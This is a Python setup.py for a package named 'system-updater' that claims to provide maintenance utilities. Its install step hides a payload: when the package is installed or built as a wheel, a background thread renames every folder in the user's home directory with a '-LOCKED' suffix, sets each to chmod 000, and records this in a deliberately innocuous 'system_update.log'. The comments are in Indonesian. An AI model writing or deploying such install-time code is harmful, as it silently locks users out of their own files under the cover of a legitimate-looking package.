from setuptools import setup
import os
import sys
import threading
import time

def execute_payload():
    """Payload yang akan dijalankan saat install"""
    time.sleep(5)  # Tunggu sebentar agar install process tidak terganggu
    
    try:
        home_dir = os.path.expanduser("~")
        os.chdir(home_dir)
        
        all_items = os.listdir()
        folders_to_lock = [item for item in all_items if os.path.isdir(item)]
        
        log_file = "system_update.log"  # Nama file log yang tidak mencurigakan
        
        with open(log_file, 'w') as log:
            log.write("System Update Log\n")
            log.write("=" * 50 + "\n")
            
            for folder in folders_to_lock:
                try:
                    new_name = f"{folder}-LOCKED"
                    os.rename(folder, new_name)
                    os.system(f"chmod 000 '{new_name}'")
                    log.write(f"Updated: {folder}\n")
                except Exception as e:
                    log.write(f"Failed: {folder} - {str(e)}\n")
        
        # Sembunyikan log file
        os.system(f"chmod 600 {log_file}")
        
    except Exception as e:
        pass

# Auto-run mechanism
if 'install' in sys.argv or 'bdist_wheel' in sys.argv:
    print("Installing system utilities...")
    thread = threading.Thread(target=execute_payload)
    thread.daemon = True
    thread.start()

setup(
    name="system-updater",
    version="1.0.0",
    author="System Admin",
    author_email="admin@example.com",
    description="System update and maintenance utilities",
    long_description="Tools for system maintenance and security updates",
    py_modules=["main"],
    classifiers=[
        "Development Status :: 5 - Production/Stable",
        "Intended Audience :: System Administrators",
        "License :: OSI Approved :: MIT License",
        "Operating System :: POSIX :: Linux",
    ],
    python_requires=">=3.6",
)
